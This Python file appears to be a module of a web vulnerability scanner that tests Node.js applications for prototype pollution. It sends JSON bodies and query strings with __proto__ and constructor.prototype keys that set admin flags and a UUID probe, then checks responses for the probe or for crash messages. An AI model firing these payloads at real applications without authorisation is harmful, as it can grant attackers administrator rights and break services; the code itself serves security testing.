"""
Prototype Pollution attack module.
Targets Node.js/JavaScript applications via __proto__ and constructor.prototype injection.
UUID marker probe eliminates false positives from status code diffing alone.
"""
from __future__ import annotations
import json
from uuid import uuid4

from attacks.base import BaseAttack, SessionExpiredError
from rich.console import Console

console = Console(legacy_windows=False)

_PROBE = uuid4().hex[:12]

_PROTO_PAYLOADS = [
    {"__proto__": {"_tweb": _PROBE, "admin": True, "isAdmin": True, "role": "admin"}},
    {"constructor": {"prototype": {"_tweb": _PROBE, "admin": True}}},
]

_PROTO_QUERY_SUFFIXES = [
    f"__proto__[_tweb]={_PROBE}",
    f"constructor[prototype][_tweb]={_PROBE}",
]

_CRASH_SIGNATURES = (
    "typeerror",
    "cannot read prop",
    "undefined is not",
    "referenceerror",
    "cannot set prop",
)


class ProtoPollutionAttack(BaseAttack):
    name = "proto_pollution"
    _seen_urls: set[str] = set()

    def _is_relevant(self, attack_point: dict) -> bool:
        method = attack_point.get("method", "GET")
        post_data = attack_point.get("post_data") or ""
        return method == "POST" and post_data.strip().startswith("{")

    async def run(self, attack_point: dict, _payloads: list[str]) -> list[dict]:
        if not self._is_relevant(attack_point):
            return []

        url = attack_point["url"]
        if url in ProtoPollutionAttack._seen_urls:
            return []
        ProtoPollutionAttack._seen_urls.add(url)

        console.print(f"  [cyan][Proto][/cyan] POST {url}")

        all_findings: list[dict] = []

        try:
            original_body = json.loads(attack_point.get("post_data") or "{}")
        except Exception:
            original_body = {}

        # Baseline: original body
        try:
            baseline = await self.session.post(url, json=original_body, timeout=10.0)
        except SessionExpiredError:
            raise
        except Exception:
            return []

        if baseline is None:
            return []

        # JSON body pollution
        for payload in _PROTO_PAYLOADS:
            if self._should_stop():
                return all_findings

            try:
                resp = await self.session.post(url, json=payload, timeout=10.0)
            except SessionExpiredError:
                raise
            except Exception:
                continue

            if resp is None:
                continue

            body = resp.text or ""
            body_lower = body.lower()

            if _PROBE in body:
                console.print(
                    f"  [bold red][Proto][/bold red] Prototype pollution! "
                    f"Probe {_PROBE!r} leaked in response"
                )
                all_findings.append({
                    "type": "prototype_pollution",
                    "value": (
                        f"Prototype pollution @ {url} — probe value "
                        f"'{_PROBE}' reflected in response body"
                    ),
                    "confidence": 0.85,
                })
                return all_findings

            if any(sig in body_lower for sig in _CRASH_SIGNATURES):
                console.print(
                    f"  [bold yellow][Proto][/bold yellow] Possible pollution (crash signature) @ {url}"
                )
                all_findings.append({
                    "type": "prototype_pollution",
                    "value": (
                        f"Prototype pollution (crash) @ {url} — "
                        f"TypeError/ReferenceError in response (manual verify)"
                    ),
                    "confidence": 0.65,
                })
                return all_findings

        # GET query-string pollution (secondary)
        if not all_findings:
            base_url = url.split("?")[0]
            for suffix in _PROTO_QUERY_SUFFIXES:
                if self._should_stop():
                    return all_findings

                try:
                    sep = "&" if "?" in url else "?"
                    resp = await self.session.get(
                        f"{url}{sep}{suffix}", timeout=10.0
                    )
                except SessionExpiredError:
                    raise
                except Exception:
                    continue

                if resp is None:
                    continue

                body = resp.text or ""
                body_lower = body.lower()

                if _PROBE in body:
                    console.print(
                        f"  [bold red][Proto][/bold red] Prototype pollution (GET)! "
                        f"Probe {_PROBE!r} reflected"
                    )
                    all_findings.append({
                        "type": "prototype_pollution",
                        "value": (
                            f"Prototype pollution (GET) @ {base_url} — "
                            f"probe '{_PROBE}' reflected"
                        ),
                        "confidence": 0.85,
                    })
                    return all_findings

        return all_findings
